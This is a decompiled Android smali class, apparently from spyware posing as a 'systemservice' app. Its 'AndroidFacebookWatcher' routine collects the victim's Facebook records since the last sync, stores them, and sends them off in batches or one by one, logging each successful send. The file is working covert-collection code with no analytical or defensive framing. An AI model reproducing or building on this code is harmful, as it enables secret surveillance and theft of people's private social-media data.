.class Lcom/systemservice/a/c/h/a;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/c/h/b;->a(Lcom/systemservice/a/d/b;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/content/SharedPreferences;

.field final synthetic b:Landroid/content/Context;

.field final synthetic c:Lcom/systemservice/a/c/h/b;


# direct methods
.method constructor <init>(Lcom/systemservice/a/c/h/b;Landroid/content/SharedPreferences;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/c/h/a;->c:Lcom/systemservice/a/c/h/b;

    iput-object p2, p0, Lcom/systemservice/a/c/h/a;->a:Landroid/content/SharedPreferences;

    iput-object p3, p0, Lcom/systemservice/a/c/h/a;->b:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 14

    const-string v0, "last_facebook_date"

    const-string v1, "FINALLY FACEBOOK"

    const-string v2, "AndroidFacebookWatcher"

    :try_start_0
    iget-object v3, p0, Lcom/systemservice/a/c/h/a;->a:Landroid/content/SharedPreferences;

    const-wide/16 v4, 0x0

    invoke-interface {v3, v0, v4, v5}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v6

    new-instance v10, Ljava/util/Date;

    const-wide/16 v8, 0x1

    add-long/2addr v6, v8

    const-wide/16 v8, 0x3e8

    mul-long v6, v6, v8

    invoke-direct {v10, v6, v7}, Ljava/util/Date;-><init>(J)V

    iget-object v3, p0, Lcom/systemservice/a/c/h/a;->c:Lcom/systemservice/a/c/h/b;

    iget-object v3, v3, Lcom/systemservice/a/d/g;->b:Lcom/systemservice/a/h/b;

    check-cast v3, Lcom/systemservice/a/h/k;

    iget-object v8, p0, Lcom/systemservice/a/c/h/a;->b:Landroid/content/Context;

    iget-object v6, p0, Lcom/systemservice/a/c/h/a;->c:Lcom/systemservice/a/c/h/b;

    invoke-static {v6}, Lcom/systemservice/a/c/h/b;->a(Lcom/systemservice/a/c/h/b;)Ljava/lang/String;

    move-result-object v9

    const/4 v11, 0x0

    iget-object v6, p0, Lcom/systemservice/a/c/h/a;->c:Lcom/systemservice/a/c/h/b;

    invoke-static {v6}, Lcom/systemservice/a/c/h/b;->b(Lcom/systemservice/a/c/h/b;)Z

    move-result v12

    const-string v13, ""

    invoke-static/range {v8 .. v13}, Lcom/systemservice/a/g/b;->a(Landroid/content/Context;Ljava/lang/String;Ljava/util/Date;Ljava/util/Date;ZLjava/lang/String;)Ljava/util/List;

    move-result-object v6

    invoke-interface {v6}, Ljava/util/List;->isEmpty()Z

    move-result v7

    if-nez v7, :cond_2

    invoke-interface {v6}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v6

    :cond_0
    :goto_0
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_1

    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Lcom/systemservice/a/e/g;

    invoke-virtual {v3, v7}, Lcom/systemservice/a/h/k;->a(Lcom/systemservice/a/e/g;)J

    iget-wide v8, v7, Lcom/systemservice/a/e/g;->d:J

    cmp-long v10, v4, v8

    if-gez v10, :cond_0

    iget-wide v4, v7, Lcom/systemservice/a/e/g;->d:J

    goto :goto_0

    :cond_1
    iget-object v6, p0, Lcom/systemservice/a/c/h/a;->a:Landroid/content/SharedPreferences;

    invoke-interface {v6}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    invoke-interface {v6, v0, v4, v5}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->apply()V

    :cond_2
    const/4 v0, 0x0

    const/4 v4, 0x4

    const/4 v5, 0x0

    invoke-virtual {v3, v0, v5, v5, v4}, Lcom/systemservice/a/h/k;->a(ZLjava/util/Date;Ljava/util/Date;I)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_5

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v4

    if-lez v4, :cond_5

    iget-object v4, p0, Lcom/systemservice/a/c/h/a;->c:Lcom/systemservice/a/c/h/b;

    invoke-virtual {v4}, Lcom/systemservice/a/d/g;->d()Lcom/systemservice/common/features/settingHistory/b;

    move-result-object v4

    check-cast v4, Lcom/systemservice/a/c/h/j;

    iget-object v5, p0, Lcom/systemservice/a/c/h/a;->b:Landroid/content/Context;

    invoke-virtual {v4, v5, v0}, Lcom/systemservice/a/c/h/j;->a(Landroid/content/Context;Ljava/util/List;)I

    move-result v5

    const/4 v6, 0x1

    if-ne v5, v6, :cond_3

    const-string v4, "SEND FACEBOOK PACKAGE SUCCESSFUL"

    invoke-static {v2, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v3, v0}, Lcom/systemservice/a/h/k;->a(Ljava/util/List;)V

    goto :goto_2

    :cond_3
    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_4
    :goto_1
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_5

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Lcom/systemservice/a/d/d;

    check-cast v5, Lcom/systemservice/a/e/g;

    iget-object v7, p0, Lcom/systemservice/a/c/h/a;->b:Landroid/content/Context;

    invoke-virtual {v4, v7, v5}, Lcom/systemservice/a/c/h/j;->a(Landroid/content/Context;Lcom/systemservice/a/e/g;)I

    move-result v7

    if-ne v7, v6, :cond_4

    const-string v7, "SEND 1 FACEBOOK SUCCESSFUL"

    invoke-static {v2, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-wide v7, v5, Lcom/systemservice/a/e/g;->a:J

    iget v5, v5, Lcom/systemservice/a/e/g;->g:I

    invoke-virtual {v3, v7, v8, v5}, Lcom/systemservice/a/h/k;->a(JI)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_1

    :catchall_0
    move-exception v0

    goto :goto_3

    :catch_0
    move-exception v0

    :try_start_1
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :cond_5
    :goto_2
    invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :goto_3
    invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    throw v0
.end method
